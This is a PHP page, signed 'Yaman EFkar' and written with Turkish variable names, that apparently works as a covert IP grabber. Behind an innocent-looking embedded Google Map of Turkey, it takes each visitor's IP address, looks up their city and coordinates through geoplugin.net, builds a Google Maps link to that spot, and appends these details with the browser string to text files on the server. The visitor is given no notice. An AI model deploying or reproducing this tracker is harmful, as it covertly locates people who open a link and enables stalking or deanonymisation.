<?php
header('Content-Type: text/html; charset=utf-8');


function GetIP(){
 if(getenv("HTTP_CLIENT_IP")) {
 $ip = getenv("HTTP_CLIENT_IP");
 } elseif(getenv("HTTP_X_FORWARDED_FOR")) {
 $ip = getenv("HTTP_X_FORWARDED_FOR");
 if (strstr($ip, ',')) {
 $tmp = explode (',', $ip);
 $ip = trim($tmp[0]);
 }
 } else {
 $ip = getenv("REMOTE_ADDR");
 }
 return $ip;
}

$ip_adresi = GetIP();
$Geo_Plugin_XML = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$ip_adresi); 

$adress = $Geo_Plugin_XML->geoplugin_request; 
$ulke = $Geo_Plugin_XML->geoplugin_countryName;
$bolge = $Geo_Plugin_XML->geoplugin_region;
$kita = $Geo_Plugin_XML->geoplugin_continentCode;
$ulkekodu = $Geo_Plugin_XML->geoplugin_countryCode;
$sehir = $Geo_Plugin_XML->geoplugin_city;
$plaka = $Geo_Plugin_XML->geoplugin_regionCode;
$enlem = $Geo_Plugin_XML->geoplugin_latitude;
$boylam = $Geo_Plugin_XML->geoplugin_longitude;
$tarayici = $_SERVER['HTTP_USER_AGENT']; 

$maps = "https://www.google.com/maps/place/".$enlem.",".$boylam."/@".$enlem.",".$boylam.",16z";
$yamanefkar["0"] = "Ip Adresi : ".$adress;
$yamanefkar["1"] = "Ulke : ".$ulke; 
$yamanefkar["2"] = "Bolge : ".$bolge;
$yamanefkar["3"] = "Kita : ".$kita;
$yamanefkar["4"] = "Ulke Kodu : ".$ulkekodu;
$yamanefkar["5"] = "Sehir : ".$sehir;
$yamanefkar["6"] = "Plaka : ".$plaka;
$yamanefkar["7"] = "Enlem : ".$enlem;
$yamanefkar["8"] = "Boylam : ".$boylam;
$yamanefkar["9"] = "Google Maps : ".$maps;
$yamanefkar["10"] = "Tarayıcı : ".$tarayici; 


$ac = fopen("yeni-ip.txt","a+");

$veriler = ("-----------Yaman EFkar-----------\n".$yamanefkar["0"]."\n".$yamanefkar["1"]."\n".$yamanefkar["2"]."\n".$yamanefkar["3"]."\n".$yamanefkar["4"]."\n".$yamanefkar["5"]."\n".$yamanefkar["6"]."\n".$yamanefkar["7"]."\n".$yamanefkar["8"]."\n".$yamanefkar["9"]."\n".$yamanefkar["10"]."\n\n\n");
fwrite($ac,$veriler);
fclose($ac);

$ac = fopen("gecmis-ip.txt","a+");
$veriler = ("-----------Yaman EFkar-----------\n".$yamanefkar["0"]."\n".$yamanefkar["1"]."\n".$yamanefkar["2"]."\n".$yamanefkar["3"]."\n".$yamanefkar["4"]."\n".$yamanefkar["5"]."\n".$yamanefkar["6"]."\n".$yamanefkar["7"]."\n".$yamanefkar["8"]."\n".$yamanefkar["9"]."\n".$yamanefkar["10"]."\n\n\n");
fwrite($ac,$veriler);
fclose($ac);


$son = fopen("maps.txt","a+");
$mapslink = ($maps);
fwrite($son,$mapslink);
fclose($son);


?>
<center>
<iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d12743676.862055203!2d26.178285126945873!3d38.757987208864336!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x14b0155c964f2671%3A0x40d9dbd42a625f2a!2zVMO8cmtpeWU!5e0!3m2!1str!2str!4v1564660927258!5m2!1str!2str" width="100%" height="100%" frameborder="0" style="border:0" allowfullscreen></iframe></center>